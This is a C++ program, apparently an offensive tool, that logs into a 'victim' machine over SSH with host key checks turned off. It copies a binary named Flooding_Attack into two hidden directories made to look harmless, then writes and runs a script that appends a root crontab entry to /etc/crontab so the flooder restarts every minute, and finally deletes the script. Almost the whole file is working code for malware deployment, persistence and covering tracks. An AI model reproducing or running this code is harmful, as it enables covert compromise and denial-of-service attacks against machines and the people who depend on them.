#include <bits/stdc++.h>
#include "cmd.cpp"
using namespace std;
int main(int argc, char **argv) {
    if (argc < 3) {
        cout << "Usage: " << argv[0] << " <victim IP address> <username>\n";
        return 0;
    }

    string ip_addr    = string(argv[1]);
    string username   = string(argv[2]);
    string ssh_prefix = "ssh "
        "-o IdentitiesOnly=yes "
        "-o StrictHostKeyChecking=no "
        "-o UserKnownHostsFile=~/.ssh/known_hosts " 
        + username + "@" + ip_addr;

    // send Flooding_Attack to hidden dictionary 1
    cmd(ssh_prefix + " \'ls -al ~ | grep .etc > /dev/null || mkdir ~/.etc\'");
    cmd(ssh_prefix + " \'ls -al ~/.etc/ | grep .module > /dev/null || mkdir ~/.etc/.module\'");
    cmd(
        "scp -o IdentitiesOnly=yes Flooding_Attack " +
        username + "@" + ip_addr +
        ":~/.etc/.module/Flooding_Attack"
    );

    // send Flooding_Attack to hidden dictionary 2
    cmd(ssh_prefix + " \'ls -al ~ | grep .config > /dev/null || mkdir ~/.config\'");
    cmd(ssh_prefix + " \'ls -al ~/.config/ | grep .hao123 > /dev/null || mkdir ~/.config/.hao123\'");
    cmd(ssh_prefix + " \'ls -al ~/.config/.hao123 | grep .module > /dev/null || mkdir ~/.config/.hao123/.module\'");
    cmd(
        "scp -o IdentitiesOnly=yes Flooding_Attack " +
        username + "@" + ip_addr +
        ":~/.config/.hao123/.module/Flooding_Attack"
    );

    // create Add_crontab file without password
    string crontab_content1 = "* * * * * root pgrep Flooding_Attack > /dev/null || (cd /home/" + username + "/.etc/.module && ./Flooding_Attack) || (cd /home/" + username + "/.config/.hao123/.module && ./Flooding_Attack)";

    ofstream *file = new ofstream("Add_crontab");
    *file << "#! /bin/bash\n\n";
    *file << "echo \"" + crontab_content1 + "\" >> /etc/crontab\n";
    delete file;
    cmd("chmod +x Add_crontab");

    // send bash script to victim
    cmd("scp -o IdentitiesOnly=yes Add_crontab " + username + "@" + ip_addr + ":~/");

    // trigger bash script
    cmd(ssh_prefix + " \'./Add_crontab\' > /dev/null");

    // remove bash script 
    cmd(ssh_prefix + " \'rm Add_crontab\'");
    cmd("rm Add_crontab");

}
